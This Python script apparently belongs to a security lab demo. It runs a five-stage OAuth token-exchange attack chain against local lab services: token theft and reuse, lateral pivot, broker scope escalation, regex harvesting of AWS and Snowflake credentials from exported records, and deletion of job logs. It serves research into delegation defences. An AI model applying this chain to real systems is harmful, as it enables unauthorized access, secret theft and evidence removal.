"""Run the same five-stage chain against the HTTP topology.

Used by the container demo. The logic is identical to `lab/chain.py`; only the
transport differs, which is the point: the result is a property of the token
shape, not of how the components are wired together.

    python -m lab.serve idp &        (and broker, resource-a, resource-b, logsink)
    python attack/http_chain.py
"""
from __future__ import annotations

import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from lab.http_common import get, post  # noqa: E402
from lab.serve import PORTS, _host  # noqa: E402
from lab.services import AGENT, ATTACKER, RESOURCE_A, RESOURCE_B  # noqa: E402

EXCHANGE_GRANT = "urn:ietf:params:oauth:grant-type:token-exchange"


def run() -> dict:
    idp = f"http://{_host('idp')}"
    broker = f"http://{_host('broker')}"
    res_a = f"http://{_host('resource-a')}"
    res_b = f"http://{_host('resource-b')}"

    _, grant = post(f"{idp}/token/grant", {})
    subject_token = grant["access_token"]

    # The agent acquires whatever the configured broker gives it.
    status, exchanged = post(f"{broker}/token", {
        "grant_type": EXCHANGE_GRANT,
        "subject_token": subject_token,
        "actor_token_sub": AGENT,
        "audience": RESOURCE_A,
        "scope": "records:read:single",
    })
    held = exchanged.get("access_token", subject_token)

    stages: list[dict] = []

    def record(technique, name, ok, detail):
        stages.append({"technique": technique, "name": name,
                       "succeeded": ok, "detail": detail})
        return ok

    record("T1528", "Steal Application Access Token", bool(held),
           "attacker obtains the token the agent currently holds")

    s2, body2 = post(f"{res_a}/records/read", {"access_token": held, "id": 1})
    record("T1550.001", "Use Application Access Token", s2 == 200,
           body2.get("reason", "token accepted by its intended audience"))

    s3a, bulk = post(f"{res_a}/records/bulkQuery", {"access_token": held})
    s3b, pivot = post(f"{res_b}/records/read", {"access_token": held, "id": 1})
    s3c, esc = post(f"{broker}/token", {
        "grant_type": EXCHANGE_GRANT, "subject_token": held,
        "actor_token_sub": ATTACKER, "audience": RESOURCE_B,
        "scope": "records:bulkQuery admin:read",
    })
    pivoted = (s3a == 200) or (s3b == 200) or (s3c == 200)
    record("T1078.004", "Valid Accounts: Cloud Accounts", pivoted,
           f"bulk query: {bulk.get('reason', 'ok')}; pivot: {pivot.get('reason', 'ok')}; "
           f"broker escalation: {esc.get('reason', 'ok')}")

    if not pivoted:
        return {"completed": False, "broke_at": "T1078.004",
                "broke_reason": bulk.get("reason", ""), "stages": stages,
                "secrets_harvested": []}

    import re
    secrets = []
    for rec in bulk.get("records", []):
        secrets += [f"aws_access_key:{m}" for m in re.findall(r"AKIA[0-9A-Z]{16}", rec["notes"])]
        secrets += [f"snowflake_token:{m}" for m in re.findall(r"sfw_[0-9a-f]{8}", rec["notes"])]
    record("T1552", "Unsecured Credentials", bool(secrets),
           f"{len(secrets)} embedded secret(s) mined from exported records")

    s5, wipe = post(f"{res_a}/jobs", {"access_token": held})
    record("T1070", "Indicator Removal", s5 == 200,
           wipe.get("reason", "query-job records deleted"))

    completed = all(s["succeeded"] for s in stages)
    return {"completed": completed,
            "broke_at": None if completed else next(s["technique"] for s in stages
                                                    if not s["succeeded"]),
            "broke_reason": "", "stages": stages, "secrets_harvested": secrets}


def main() -> int:
    result = run()
    for stage in result["stages"]:
        print(f"  [{'PASS' if stage['succeeded'] else 'FAIL'}] "
              f"{stage['technique']:<10} {stage['name']}")
        print(f"         {stage['detail']}")
    if result["completed"]:
        print(f"\n  CHAIN COMPLETED. Secrets harvested: {len(result['secrets_harvested'])}")
    else:
        print(f"\n  CHAIN BROKEN at {result['broke_at']}, the delegation step.")
    status, events = get(f"http://{_host('logsink')}/events")
    if status == 200:
        print(f"  Telemetry events collected: {events['count']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
